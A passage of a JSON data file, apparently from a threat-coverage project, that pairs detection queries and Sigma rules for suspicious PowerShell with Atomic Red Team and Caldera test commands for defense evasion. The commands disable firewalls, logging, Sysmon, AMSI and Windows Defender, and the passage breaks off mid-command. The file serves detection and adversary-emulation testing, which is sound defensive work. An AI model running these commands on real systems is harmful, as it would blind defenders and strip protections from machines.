CommandLine=\"*Y2h1bmtfc2l6Z*\" OR CommandLine=\"*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*\" OR CommandLine=\"*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*\" OR CommandLine=\"*lPLkNvbXByZXNzaW9u*\" OR CommandLine=\"*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*\" OR CommandLine=\"*SU8uQ29tcHJlc3Npb2*\" OR CommandLine=\"*Ty5Db21wcmVzc2lvb*\" OR CommandLine=\"*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*\" OR CommandLine=\"*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*\" OR CommandLine=\"*lPLk1lbW9yeVN0cmVhb*\" OR CommandLine=\"*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*\" OR CommandLine=\"*SU8uTWVtb3J5U3RyZWFt*\" OR CommandLine=\"*Ty5NZW1vcnlTdHJlYW*\" OR CommandLine=\"*4ARwBlAHQAQwBoAHUAbgBrA*\" OR CommandLine=\"*5HZXRDaHVua*\" OR CommandLine=\"*AEcAZQB0AEMAaAB1AG4Aaw*\" OR CommandLine=\"*LgBHAGUAdABDAGgAdQBuAGsA*\" OR CommandLine=\"*LkdldENodW5r*\" OR CommandLine=\"*R2V0Q2h1bm*\" OR CommandLine=\"*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*\" OR CommandLine=\"*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*\" OR CommandLine=\"*RIUkVBRF9JTkZPNj*\" OR CommandLine=\"*SFJFQURfSU5GTzY0*\" OR CommandLine=\"*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*\" OR CommandLine=\"*VEhSRUFEX0lORk82N*\" OR CommandLine=\"*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*\" OR CommandLine=\"*cmVhdGVSZW1vdGVUaHJlYW*\" OR CommandLine=\"*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*\" OR CommandLine=\"*NyZWF0ZVJlbW90ZVRocmVhZ*\" OR CommandLine=\"*Q3JlYXRlUmVtb3RlVGhyZWFk*\" OR CommandLine=\"*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*\" OR CommandLine=\"*0AZQBtAG0AbwB2AGUA*\" OR CommandLine=\"*1lbW1vdm*\" OR CommandLine=\"*AGUAbQBtAG8AdgBlA*\" OR CommandLine=\"*bQBlAG0AbQBvAHYAZQ*\" OR CommandLine=\"*bWVtbW92Z*\" OR CommandLine=\"*ZW1tb3Zl*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"* hidden *\" CommandLine IN [\"*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*\", \"*aXRzYWRtaW4gL3RyYW5zZmVy*\", \"*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*\", \"*JpdHNhZG1pbiAvdHJhbnNmZX*\", \"*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*\", \"*Yml0c2FkbWluIC90cmFuc2Zlc*\", \"*AGMAaAB1AG4AawBfAHMAaQB6AGUA*\", \"*JABjAGgAdQBuAGsAXwBzAGkAegBlA*\", \"*JGNodW5rX3Npem*\", \"*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*\", \"*RjaHVua19zaXpl*\", \"*Y2h1bmtfc2l6Z*\", \"*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*\", \"*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*\", \"*lPLkNvbXByZXNzaW9u*\", \"*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*\", \"*SU8uQ29tcHJlc3Npb2*\", \"*Ty5Db21wcmVzc2lvb*\", \"*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*\", \"*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*\", \"*lPLk1lbW9yeVN0cmVhb*\", \"*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*\", \"*SU8uTWVtb3J5U3RyZWFt*\", \"*Ty5NZW1vcnlTdHJlYW*\", \"*4ARwBlAHQAQwBoAHUAbgBrA*\", \"*5HZXRDaHVua*\", \"*AEcAZQB0AEMAaAB1AG4Aaw*\", \"*LgBHAGUAdABDAGgAdQBuAGsA*\", \"*LkdldENodW5r*\", \"*R2V0Q2h1bm*\", \"*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*\", \"*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*\", \"*RIUkVBRF9JTkZPNj*\", \"*SFJFQURfSU5GTzY0*\", \"*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*\", \"*VEhSRUFEX0lORk82N*\", \"*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*\", \"*cmVhdGVSZW1vdGVUaHJlYW*\", \"*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*\", \"*NyZWF0ZVJlbW90ZVRocmVhZ*\", \"*Q3JlYXRlUmVtb3RlVGhyZWFk*\", \"*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*\", \"*0AZQBtAG0AbwB2AGUA*\", \"*1lbW1vdm*\", \"*AGUAbQBtAG8AdgBlA*\", \"*bQBlAG0AbQBvAHYAZQ*\", \"*bWVtbW92Z*\", \"*ZW1tb3Zl*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*.* hidden .*)(?=.*(?:.*.*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA.*|.*.*aXRzYWRtaW4gL3RyYW5zZmVy.*|.*.*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA.*|.*.*JpdHNhZG1pbiAvdHJhbnNmZX.*|.*.*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg.*|.*.*Yml0c2FkbWluIC90cmFuc2Zlc.*|.*.*AGMAaAB1AG4AawBfAHMAaQB6AGUA.*|.*.*JABjAGgAdQBuAGsAXwBzAGkAegBlA.*|.*.*JGNodW5rX3Npem.*|.*.*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ.*|.*.*RjaHVua19zaXpl.*|.*.*Y2h1bmtfc2l6Z.*|.*.*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A.*|.*.*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg.*|.*.*lPLkNvbXByZXNzaW9u.*|.*.*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA.*|.*.*SU8uQ29tcHJlc3Npb2.*|.*.*Ty5Db21wcmVzc2lvb.*|.*.*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ.*|.*.*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA.*|.*.*lPLk1lbW9yeVN0cmVhb.*|.*.*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A.*|.*.*SU8uTWVtb3J5U3RyZWFt.*|.*.*Ty5NZW1vcnlTdHJlYW.*|.*.*4ARwBlAHQAQwBoAHUAbgBrA.*|.*.*5HZXRDaHVua.*|.*.*AEcAZQB0AEMAaAB1AG4Aaw.*|.*.*LgBHAGUAdABDAGgAdQBuAGsA.*|.*.*LkdldENodW5r.*|.*.*R2V0Q2h1bm.*|.*.*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A.*|.*.*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA.*|.*.*RIUkVBRF9JTkZPNj.*|.*.*SFJFQURfSU5GTzY0.*|.*.*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA.*|.*.*VEhSRUFEX0lORk82N.*|.*.*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA.*|.*.*cmVhdGVSZW1vdGVUaHJlYW.*|.*.*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA.*|.*.*NyZWF0ZVJlbW90ZVRocmVhZ.*|.*.*Q3JlYXRlUmVtb3RlVGhyZWFk.*|.*.*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA.*|.*.*0AZQBtAG0AbwB2AGUA.*|.*.*1lbW1vdm.*|.*.*AGUAbQBtAG8AdgBlA.*|.*.*bQBlAG0AbQBvAHYAZQ.*|.*.*bWVtbW92Z.*|.*.*ZW1tb3Zl.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Invocation based on Parent Process\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: experimental\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nauthor: Florian Roth\nreferences:\n    - https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        Image:\n            - '*\\powershell.exe'\n    falsepositive:\n        CurrentDirectory: '*\\Health Service State\\\\*'\n    condition: selection and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Invocation based on Parent Process\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: experimental\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nauthor: Florian Roth\nreferences:\n    - https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        Image:\n            - '*\\powershell.exe'\n    falsepositive:\n        CurrentDirectory: '*\\Health Service State\\\\*'\n    condition: selection and not falsepositive\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:(*\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe) AND Image.keyword:(*\\\\\\\\powershell.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\Health\\\\ Service\\\\ State\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Invocation-based-on-Parent-Process <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Invocation based on Parent Process\",\\n    \"description\": \"Detects suspicious powershell invocations from interpreters or unusual programs\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\\\\\\\\\Health\\\\\\\\ Service\\\\\\\\ State\\\\\\\\\\\\\\\\*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\\\\\\\\\Health\\\\\\\\ Service\\\\\\\\ State\\\\\\\\\\\\\\\\*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Invocation based on Parent Process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:(*\\\\\\\\wscript.exe *\\\\\\\\cscript.exe) AND Image.keyword:(*\\\\\\\\powershell.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\Health Service State\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((ParentImage=\"*\\\\\\\\wscript.exe\" OR ParentImage=\"*\\\\\\\\cscript.exe\") (Image=\"*\\\\\\\\powershell.exe\")) NOT (CurrentDirectory=\"*\\\\\\\\Health Service State\\\\\\\\*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentImage IN [\"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\"] Image IN [\"*\\\\\\\\powershell.exe\"])  -(CurrentDirectory=\"*\\\\\\\\Health Service State\\\\\\\\*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe))(?=.*(?:.*.*\\\\powershell\\\\.exe))))(?=.*(?!.*(?:.*(?=.*.*\\\\Health Service State\\\\\\\\.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell Script Run in AppData\nid: ac175779-025a-4f12-98b0-acdaeb77ea85\nstatus: experimental\ndescription: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1082851155481288706\n    - https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth\ndate: 2019/01/09\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* /c powershell*\\AppData\\Local\\\\*'\n            - '* /c powershell*\\AppData\\Roaming\\\\*'\n    condition: selection\nfalsepositives:\n    - Administrative scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell Script Run in AppData\nid: ac175779-025a-4f12-98b0-acdaeb77ea85\nstatus: experimental\ndescription: Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder\nreferences:\n    - https://twitter.com/JohnLaTwC/status/1082851155481288706\n    - https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth\ndate: 2019/01/09\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '* /c powershell*\\AppData\\Local\\\\*'\n            - '* /c powershell*\\AppData\\Roaming\\\\*'\n    condition: selection\nfalsepositives:\n    - Administrative scripts\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\/c\\\\ powershell*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\* OR *\\\\ \\\\/c\\\\ powershell*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Script-Run-in-AppData <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Script Run in AppData\",\\n    \"description\": \"Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/c\\\\\\\\ powershell*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\* OR *\\\\\\\\ \\\\\\\\/c\\\\\\\\ powershell*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\/c\\\\\\\\ powershell*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\* OR *\\\\\\\\ \\\\\\\\/c\\\\\\\\ powershell*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Roaming\\\\\\\\\\\\\\\\*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Script Run in AppData\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(* \\\\/c powershell*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\* * \\\\/c powershell*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* /c powershell*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*\" OR CommandLine=\"* /c powershell*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"* /c powershell*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\*\", \"* /c powershell*\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* /c powershell.*\\\\AppData\\\\Local\\\\\\\\.*|.*.* /c powershell.*\\\\AppData\\\\Roaming\\\\\\\\.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "ET POLICY Powershell Activity Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY Powershell Command With No Profile Argument Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY Powershell Command With Hidden Window Argument Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY Powershell Command With Execution Bypass Argument Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY Powershell Command With Encoded Argument Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY Powershell Command With NonInteractive Argument Over SMB - Likely Lateral Movement", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY SMB NT Create AndX Request For a Powershell .ps1 File", "product": "Suricata (NSM)", "name": "ET Pro Rule"}, {"query": "ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File", "product": "Suricata (NSM)", "name": "ET Pro Rule"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "setenforce 0\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "fltmc.exe unload SysmonDrv\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sysmon -u\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "net.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')\n$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0\n$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "name": null}, {"source": "data/abilities/defense-evasion/49470433-30ce-4714-a44b-bea9dbbeca9a.yml", "command": {"windows": {"psh": {"cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0", "command": "Set-MPPreference -DisableRealtimeMonitoring 1\n"}}}, "name": "Disable Windows Defender Real-Time Protection"}, {"source": "data/abilities/defense-evasion/b007f6e8-4a87-4440-8888-29ceab047d9b.yml", "command": {"windows": {"psh": {"cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n", "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n"}}}, "name": "Disable Windows Defender All"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/disable_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/disable_rdp", "name": "Empire Module Command"}], "command_list": ["if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n", "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "setenforce 0\n", "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n", "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "fltmc.exe unload SysmonDrv\n", "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n", "sysmon -u\n", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "net.exe stop McAfeeDLPAgentService\nsc.exe config 